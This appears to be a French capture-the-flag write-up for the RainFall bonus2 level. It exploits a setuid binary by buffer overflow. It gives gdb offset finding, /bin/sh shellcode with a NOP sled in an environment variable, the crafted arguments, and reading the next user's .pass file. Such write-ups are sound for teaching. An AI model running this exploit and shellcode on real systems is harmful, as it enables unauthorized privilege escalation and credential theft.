## Comportement
- J'ai des droits `bonus2` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2*`
- En exécutant le binaire (`./bonus2`), on observe qu'il attend 1 argument de la part de l'utilisateur print "Hello {argv[1]}".
    ```shell
        bonus2@RainFall:~$ ./bonus2 
        bonus2@RainFall:~$ ./bonus2 bla
        bonus2@RainFall:~$ ./bonus2 bla bla
        Hello bla
        bonus2@RainFall:~$
    ```


## Analyse
- Le programme prend 2 arguments. Il copie au maximum 40 octets de argv[1] dans un buffer, et au plus 32 octets de argv[2] dans le même buffer à l'indice 40 (donc après argv[1]). Ensuite, dans `greetuser()`, il copie un message (de longueur différente selon la langue) dans un buffer de 64 octets. Et puis il le concatène avec notre chaîne fournie en paramètre.
- On va mettre notre payload dans une variable d'environnement que l'on va exporter puis indiauer cette adresse lors de l'ecrasement de l'`eip`


## Résolution
- On cherche l'`eip` avec LANG = nl. Il est egal a 23. 
    ```shell
        bonus2@RainFall:~$ export LANG=nl
        bonus2@RainFall:~$ gdb bonus2
        (gdb) run $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
        Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

        Program received signal SIGSEGV, Segmentation fault.
        0x38614137 in ?? ()              // offset : 23
    ```
- On place un shellcode dans une variable d'env PAYLOAD precede n'un long nopsleg
    ```shell
        export PAYLOAD="`python -c 'print "\x90" * 4096+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`"
    ```
- Pour trouver l'adresse de la variable d'env PAYLOAD (+ un petit decalage pour etre sur de tomber dans les NOP) on peut utiliser gdb : `x/1s *((char **)environ)` ou `x/s *environ`
    ```shell
        bonus2@RainFall:~$ export LANG="nl"
        bonus2@RainFall:~$ export PAYLOAD="`python -c 'print "\x90" * 4096+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`"
        bonus2@RainFall:~$ gdb ./bonus2
        (gdb) b main
        Breakpoint 1 at 0x804852f
        (gdb) run
        Starting program: /home/user/bonus2/bonus2

        Breakpoint 1, 0x0804852f in main ()
        (gdb) x/50s *environ
        0xbfffe8f4:      "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
        (gdb) p/x 0xbfffe8f4+512
        $1 = 0xbfffeaf4
    ```
- On craft notre payload avec : 
    - argv[1] : padding de 40 octets
    - argv[2] : offset 23 octets + adresse dans la variable d'env LANG
```shell
    ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xf4\xea\xff\xbf"')
```
- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `bonus3`.
- Il ne reste plus qu'à :
  - récupérer le password (`cat /home/user/bonus3/.pass`)
  - quitter le shell (`exit`)
  - et passer au bonus3 (`su bonus3`) en renseignant ce password.
